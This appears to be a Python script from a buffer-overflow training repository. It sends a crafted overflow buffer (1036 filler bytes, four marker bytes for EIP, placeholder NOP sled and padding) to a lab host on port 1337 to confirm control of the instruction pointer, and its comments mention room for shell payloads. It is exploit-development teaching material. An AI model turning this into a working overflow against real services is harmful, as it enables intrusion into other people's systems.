import socket
import sys

#
# opinfosec
# Eip Test Confirmation of Control of EIP
# https://github.com/opsec-infosec/BufferOverflow
#

# ASCII:
# A = 41
# X = 58
# E = 45


filler = "A" * 1036
eip = "X" * 4
extend = "E" * 95   # Just enough to fit our payload -- Typical calc payload is ~220 Bytes :: Shell Payload is ~350 Bytes
nop_sled = "N" * 16
try:
    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("172.16.110.135", 1337))
    buffer = filler + eip + nop_sled + extend
    s.send(buffer.encode("latin-1"))
    s.close()

except Exception as ex:
    print ("Error: ", ex)
    sys.exit(1)

sys.exit(0)
